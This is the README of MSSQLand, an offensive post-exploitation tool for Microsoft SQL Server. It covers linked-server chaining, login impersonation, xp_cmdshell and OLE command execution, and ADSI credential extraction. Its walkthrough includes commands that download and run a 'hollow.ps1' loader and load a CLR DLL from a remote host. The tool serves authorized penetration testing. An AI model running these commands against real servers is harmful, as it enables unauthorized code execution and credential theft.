# MSSQLand ✈️
Land gracefully in your target MSSQL DBMS, as if arriving on a business-class flight with a champagne glass in hand. 🥂

<p align="center">
    <img width="350" src="/media/MSSQLand__icon.webp" alt="MSSQLand Logo">
</p>

MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) in your red activities. Primarily designed for constrained environments where operations must be conducted directly through your beacon. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.

## Command-Line Arguments

| Argument           | Description                                            |
| ------------------ | ------------------------------------------------------ |
| /h or /host        | Specify the target SQL Server (mandatory).             |
| /c or /credentials | Specify the credential type (mandatory).               |
| /u or /username    | Provide the username (if required by credential type). |
| /p or /password    | Provide the password (if required by credential type). |
| /d or /domain      | Provide the domain (if required by credential type).   |
| /a or /action      | Specify the action to execute (default: 'info').       |
| /l or /links       | Specify linked server chain for multi-hop connections. |
| /db                | Specify the target database (optional).                |
| /e or /enum        | Execute tasks related to enumeration.                  |
| /silent            | Enable silent mode (minimal output).                   |
| /debug             | Enable debug mode for detailed logs.                   |
| /help              | Display this help message and exit.                    |


### Credential Types

| Type    | Required Arguments         |
| ------- | -------------------------- |
| token   | None                       |
| domain  | username, password, domain |
| local   | username, password         |
| entraid | username, password         |
| azure   | username, password         |


### Available Actions

| Action          | Description                                                                   | Arguments                                                      |
| --------------- | ----------------------------------------------------------------------------- | -------------------------------------------------------------- |
| rows            | Retrieve rows from a table.                                                   | database (string),schema (string, default: dbo),table (string) |
| query           | Execute a custom SQL query.                                                   | query (string)                                                 |
| links           | Retrieve linked server information.                                           |                                                                |
| exec            | Execute commands using xp_cmdshell.                                           | command (string)                                               |
| pwsh            | Execute PowerShell commands.                                                  | script (string)                                                |
| pwshdl          | Download and execute a PowerShell script.                                     | url (string)                                                   |
| read            | Read file contents.                                                           | filePath (string)                                              |
| rpc             | Call remote procedures on linked servers.                                     | action (string),linkedServerName (string)                      |
| impersonate     | Check and perform user impersonation.                                         |                                                                |
| info            | Retrieve information about the DBMS server.                                   |                                                                |
| whoami          | Retrieve information about the current user.                                  |                                                                |
| smb             | Send SMB requests.                                                            | uncPath (string)                                               |
| users           | List database users.                                                          |                                                                |
| permissions     | Enumerate permissions.                                                        | database (string),schema (string, default: dbo),table (string) |
| procedures      | List available procedures.                                                    |                                                                |
| tables          | List tables in a database.                                                    | database (string)                                              |
| databases       | List available databases.                                                     |                                                                |
| config          | Use sp_configure to modify settings.                                          | state (int, default: 0),optionName (string)                    |
| search          | Search for specific keyword in database.                                      | database (string),keyword (string)                             |
| ole             | Executes the specified command using OLE Automation Procedures.               | command (string)                                               |
| clr             | Deploy and execute CLR assemblies.                                            | dllURI (string),function (string)                              |
| agents          | Interact with and manage SQL Server Agent jobs.                               |                                                                |
| adsi-creds      | Extract credentials by querying your own LDAP server using the ADSI provider. | port (int, default: 0)                                         |
| monitor         | List running SQL commands.                                                    |                                                                |
| kill            | Terminate running SQL commands by session ID or all.                          | target (string)                                                |
| oledb-providers | Retrieve detailed configuration and properties of OLE DB providers.           |                                                                |

### Enumerations

| Enumeration | Description                |
| ----------- | -------------------------- |
| servers     | Search for MS SQL Servers. |

## Output

The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports.  All the output tables are Markdown-friendly and can be directly copied and pasted into your notes. For example, running this command:
```shell
.\MSSQLand.exe /h:SQL01:Moulinier /c:token /a:search agents pass
```

Create the following output:
```txt
===========================================
         Executing from: SQL01
    Time Zone ID: Romance Standard Time
  Local Time: 13:42:48, UTC Offset: 01:00
===========================================

===========================================
  Start at 2025-01-17 12:42:48:53388 UTC
===========================================

[>] Trying to connect with LocalCredentials
[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master
|-> Server Version: 15.00.2000
|-> Client Workstation ID: WS-445c74
|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
|-> Mapped to the user dbo
[i] You can impersonate anyone on SQL01 as a sysadmin
[+] Successfully impersonated user: Moulinier

[>] Executing action 'Search' against SQL01
|-> Searching for 'pass' in database 'agents'

[+] Found 'pass' in column headers:

| FQTN                   | Header | Ordinal Position |
| ---------------------- | ------ | ---------------- |
| [agents].[dbo].[users] | pass   | 3                |

[+] Found 'pass' in [agents].[dbo].[users] rows:

| id | name  | pass               |
| -- | ----- | ------------------ |
| 7  | Calot | password04/06/1958 |

[+] Search completed.

===========================================
   End at 2025-01-17 12:42:48:66109 UTC
       Total duration: 0.13 seconds
===========================================
```

## Show Time 👑
You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth. Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you!

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 

This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:

- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):

```sql
SELECT * FROM OPENQUERY([SQL02], 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY([SQL03], ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
```

- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):

```shell
EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT [SQL03]; REVERT;') AT [SQL02]
```

No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master
|-> Server Version: 15.00.2000
|-> Client Workstation ID: WS-445c74
|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
|-> Mapped to the user dbo
[i] You can impersonate anyone on SQL01 as a sysadmin
[+] Successfully impersonated user: webapp02
[i] Logged in as webapp02
|-> Mapped to the user dbo
[i] Execution chain: SQL02 -> SQL03 -> SQL04
[i] Logged in on SQL04 as webapps
|-> Mapped to the user guest

[>] Executing action 'Links' against SQL04
|-> Retrieving Linked SQL Servers

| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
| -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |
```

Now you want to verify who you can impersonate at the end of the chain:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master
|-> Server Version: 15.00.2000
|-> Client Workstation ID: WS-445c74
|-> Client Connection ID: b7c172a7-c349-4268-a466-285d2af89fbb
[i] Logged in on SQL01 as NT AUTHORITY\SYSTEM
|-> Mapped to the user dbo
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp02
[i] Server chain: SQL02 -> SQL03 -> SQL04
[i] Logged in as webapps
|-> Mapped to the user guest

[>] Executing action 'Impersonation' against SQL04
|-> Starting impersonation check for all logins
|-> Checking impersonation permissions individually

| Logins      | Impersonation |
| ----------- | ------------- |
| sa          | No            |
| MarieJo     | Yes           |
| Imane       | Yes           |
| John        | No            |
```

Great! Now you can directly reach out to your loader with:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

Or even use Common Language Runtime (CLR) to load remotely a library with:
```txt
/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
```

## Project Structure 📚
This project follows several key software development principles and practices.

1. **Single Responsability Principle (SRP)**

Each class should have one, and only one, reason to change. Each action class in the [`Actions`](./MSSQLand/Actions) directory, like [`Tables`](./MSSQLand/Actions/Database/Tables.cs) or [`Permissions`](./MSSQLand/Actions/Database/Permissions.cs), is responsible for a single operation.
The [`Logger`](./MSSQLand/Utilities/Logger.cs) class solely handles logging, decoupling it from other logic.

3. **Open/Close Principle (OCP)**

Software entities should be open for extension but closed for modification. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) abstract class defines a common interface-like for all actions. New actions can be added by inheriting from it without modifying existing code. Then, the [`ActionFactory`](./MSSQLand/Actions/ActionFactory.cs) enables seamless addition of new actions by simply adding them to the switch case.

4. **Liskov Substitution Principle (LSP)**

Subtypes should be substitutable for their base types without altering program behavior. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) class ensures all derived actions (e.g., Tables, Permissions, Smb) can be used interchangeably, provided they implement `ValidateArguments` and `Execute`.

5. **DRY (Don't Repeat Yourself)**

Avoid duplicating logic across the codebase. The [`QueryService`](./MSSQLand/Services/QueryService.cs) centralizes query execution, avoiding repetition in individual actions.

6. **KISS (Keep It Simple, Stupid)**

Systems should be as simple as possible but no simpler. Complex linked server queries and impersonation are abstracted into services, simplifying their usage.

8. **Extensibility**

The system should be easy to extend with new features. New actions can be added without altering core functionality by extending [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) and adding the created-one to the [factory](./MSSQLand/Actions/ActionFactory.cs).

#### Directories

- [`Models`](./MSSQLand/Models)

Contains classes representing SQL Server entities, such as Server and LinkedServers.

- [`Services`](./MSSQLand/Services)

The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.

- [`Actions`](./MSSQLand/Actions)

This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.

- [`Utilities`](./MSSQLand/Utilities)

Helper classes like Logger and MarkdownFormatter that make your life easier.

## Contributing 🫂
Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
Open-source thrives on collaboration and recognition. Contributions, large or small, help improve the tool and its community. Your time and effort are truly valued. 

Here, no one will be erased from Git history. No fear to have here—no one will copy-paste your code without adhering to the collaborative ethos of open-source.

Please see the [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines on how to get started.

## Origin 🥚
MSSQLand was initially inspired by [SQLRecon](https://github.com/skahwah/SQLRecon), which provided a solid foundation for MS SQL post-exploitation and reconnaissance. However, during my contributions to SQLRecon — particularly in addressing [chained linked server traversal](https://github.com/skahwah/SQLRecon/issues/16#issuecomment-2048435229) and enhancing user impersonation — I encountered significant roadblocks in how contributions were handled. [My pull request](https://github.com/skahwah/SQLRecon/pull/17), which introduced major improvements in impersonation, chaining, and context management, was ultimately not merged but copy pasted.

Rather than let this work go to waste, I decided to develop MSSQLand, an OOP-driven, modular, and community-friendly alternative. Unlike SQLRecon, which required deep refactoring to make simple modifications, MSSQLand was built with developers in mind. The tool is built with extensibility in mind, allowing integration of new features while maintaining clarity and simplicity. It aims to provide a structured, customizable, and operator-friendly experience for engagements requiring MS SQL exploitation.

While I appreciate the inspiration SQLRecon provided, MSSQLand is designed to be open to contributions, transparent in development, and aligned with the collaborative spirit of open-source software. 

## Disclaimer ⚠️
This tool is designed for educational purposes only and is intended to assist security professionals in understanding and testing the security of SQL Server environments in authorized engagements. It is specifically crafted to be used in controlled environments, such as:
- Penetration testing labs (e.g., HackTheBox, OffSec exam scenarios).
- Personal lab setups designed for ethical hacking and security research.

## Legal Notice
Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.

Use responsibly and ethically. Always respect the law and obtain proper authorization.
